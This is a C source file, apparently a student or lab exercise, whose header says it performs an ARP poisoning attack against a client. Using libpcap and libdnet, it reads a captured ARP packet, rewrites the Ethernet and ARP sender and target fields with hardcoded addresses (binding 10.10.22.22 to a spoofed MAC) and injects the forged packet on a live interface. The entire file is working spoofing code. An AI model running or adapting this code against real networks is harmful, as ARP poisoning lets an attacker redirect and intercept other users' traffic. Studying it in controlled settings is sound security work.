/**************************************************
HighCastle.c

Date: October 8, 2018

Author: Joseph Rocha <JosephRocha.CS@gmail.com>

Purpose: This program performs a ARP poison attack
         against a client.

**************************************************/
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <pcap.h>
#include <dnet.h>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <net/ethernet.h>

typedef struct arphdr{
    u_int16_t htype;    /* Hardware Type           */
    u_int16_t ptype;    /* Protocol Type           */
    u_char hlen;        /* Hardware Address Length */
    u_char plen;        /* Protocol Address Length */
    u_int16_t oper;     /* Operation Code          */
    u_char sha[6];      /* Sender hardware address */
    u_char spa[4];      /* Sender IP address       */
    u_char tha[6];      /* Target hardware address */
    u_char tpa[4];      /* Target IP address       */
}arphdr_t;

int main(int argc, char **argv) {
    srand(time(NULL));
    char *device; /* Name of device (e.g. eth0, wlan0) */
    char error_buffer[PCAP_ERRBUF_SIZE]; /* Size defined in pcap.h */
    pcap_t *handle;
    pcap_t *handle2;
    const u_char *packet;
    bpf_u_int32 subnet_mask, ip;
    struct pcap_pkthdr packet_header;
    int packet_count_limit = 10000;
    int timeout_limit = 10000; /* In milliseconds */

    /* Find a device */
    device = "eno1";//pcap_lookupdev(error_buffer);
    pcap_lookupnet(device, &ip, &subnet_mask, error_buffer);

    /* Open device for live capture */
    handle = pcap_open_live(device, BUFSIZ, packet_count_limit, timeout_limit, error_buffer);
    handle2 = pcap_open_offline("arp.pcap", error_buffer);
    packet = pcap_next(handle2, &packet_header);
    struct arphdr* arp_header = (struct arphdr*) (packet + sizeof(struct ether_header));
    struct addr sa;
    eth_addr_t ether_address;

    // Set destination (ethernet) as the client we are attacking.
    struct ether_header* eth_header = (struct ether_header*) packet;
    eth_pton("94:c6:91:a0:90:26", &ether_address);
    memcpy(&eth_header->ether_dhost, &ether_address, ETH_ADDR_LEN);

    //Insert this record into the ARP table.
    inet_pton(AF_INET, "10.10.22.22", &(sa.addr_ip));
    memcpy(&arp_header->spa, &sa.addr_ip, IP_ADDR_LEN);
    eth_pton("de:ad:be:ef:de:ad", &ether_address);
    memcpy(&arp_header->sha, &ether_address, ETH_ADDR_LEN);

    //Set Target IP and MAC?
    inet_pton(AF_INET, "10.10.22.23", &(sa.addr_ip));
    memcpy(&arp_header->tpa, &sa.addr_ip, IP_ADDR_LEN);
    eth_pton("94:c6:91:a0:90:26", &ether_address);
    memcpy(&arp_header->tha, &ether_address, ETH_ADDR_LEN);
    pcap_inject(handle, packet, packet_header.len);
    return 0;
}
